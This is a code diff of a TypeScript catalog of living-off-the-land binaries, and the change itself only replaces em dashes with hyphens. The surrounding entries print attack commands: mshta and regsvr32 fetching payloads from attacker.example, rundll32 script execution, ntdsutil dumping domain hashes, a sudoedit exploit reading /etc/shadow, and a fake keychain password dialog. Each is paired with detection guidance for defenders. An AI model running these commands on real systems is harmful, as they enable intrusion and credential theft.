@@ -36,7 +36,7 @@ export interface LolbinEntry {
   legit: string;
   /** Detection idea. */
   detection: string;
-  /** Source — LOLBAS / GTFOBins / vendor advisory. */
+  /** Source - LOLBAS / GTFOBins / vendor advisory. */
   source: 'LOLBAS' | 'GTFOBins' | 'LOOBins' | 'WTFBins';
   /** Reference URL (may be the catalog page). */
   url: string;
@@ -52,7 +52,7 @@ export const LOLBINS: LolbinEntry[] = [
     technique: 'Run remote HTA / VBS / JS code',
     example: 'mshta.exe https://attacker.example/payload.hta',
     attack: ['T1218.005'],
-    legit: 'Microsoft HTML Application host — historically used for IE-era apps.',
+    legit: 'Microsoft HTML Application host - historically used for IE-era apps.',
     detection: 'Alert on mshta.exe with a network arg or unusual parent (Office, browser, mail client).',
     source: 'LOLBAS',
     url: 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
@@ -66,7 +66,7 @@ export const LOLBINS: LolbinEntry[] = [
     example:
       'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc.exe")',
     attack: ['T1218.011'],
-    legit: 'Loads and runs DLL exports — used legitimately by every Windows component.',
+    legit: 'Loads and runs DLL exports - used legitimately by every Windows component.',
     detection: 'rundll32 with javascript:, .dll,EntryPoint where path is non-system, or no arg at all.',
     source: 'LOLBAS',
     url: 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
@@ -76,7 +76,7 @@ export const LOLBINS: LolbinEntry[] = [
     binary: 'regsvr32.exe',
     platforms: ['windows'],
     category: 'execute',
-    technique: '"Squiblydoo" — register remote scriptlet, run code',
+    technique: '"Squiblydoo" - register remote scriptlet, run code',
     example: 'regsvr32 /s /u /n /i:https://attacker.example/file.sct scrobj.dll',
     attack: ['T1218.010'],
     legit: 'Registers / unregisters DLLs and OCXs for COM.',
@@ -120,7 +120,7 @@ export const LOLBINS: LolbinEntry[] = [
     attack: ['T1047'],
     legit: 'WMI command-line; deprecated but still present on most Windows installs.',
     detection:
-      'wmic with /node: and process call create — monitor 4688 (auditpol on subjects of WMI) and Sysmon EID 1.',
+      'wmic with /node: and process call create - monitor 4688 (auditpol on subjects of WMI) and Sysmon EID 1.',
     source: 'LOLBAS',
     url: 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
   },
@@ -229,7 +229,7 @@ export const LOLBINS: LolbinEntry[] = [
     technique: 'Dump NTDS.dit (domain hashes)',
     example: 'ntdsutil "ac i ntds" "ifm" "create full c:\\temp\\ntds" q q',
     attack: ['T1003.003'],
-    legit: 'Active Directory snapshot / IFM media creation — domain admin only.',
+    legit: 'Active Directory snapshot / IFM media creation - domain admin only.',
     detection: 'ntdsutil running on a non-DC, or any host with arguments mentioning "ifm".',
     source: 'LOLBAS',
     url: 'https://lolbas-project.github.io/lolbas/Binaries/Ntdsutil/',
@@ -400,7 +400,7 @@ export const LOLBINS: LolbinEntry[] = [
     binary: 'sudoedit',
     platforms: ['linux'],
     category: 'priv-esc',
-    technique: 'CVE-2023-22809 — env var EDITOR / VISUAL hijack',
+    technique: 'CVE-2023-22809 - env var EDITOR / VISUAL hijack',
     example: 'EDITOR="vim -- /etc/shadow" sudoedit /etc/anything',
     attack: ['T1548.003'],
     legit: 'Sudo-managed file editing.',
@@ -459,7 +459,7 @@ export const LOLBINS: LolbinEntry[] = [
       'osascript -e \'display dialog "Keychain wants to use the login keychain." default answer "" with hidden answer\'',
     attack: ['T1056.002'],
     legit: 'AppleScript runner.',
-    detection: 'osascript with display dialog containing "password" or "keychain" — flag as user-input prompt.',
+    detection: 'osascript with display dialog containing "password" or "keychain" - flag as user-input prompt.',
     source: 'LOOBins',
     url: 'https://www.loobins.io/binaries/osascript/',
   },
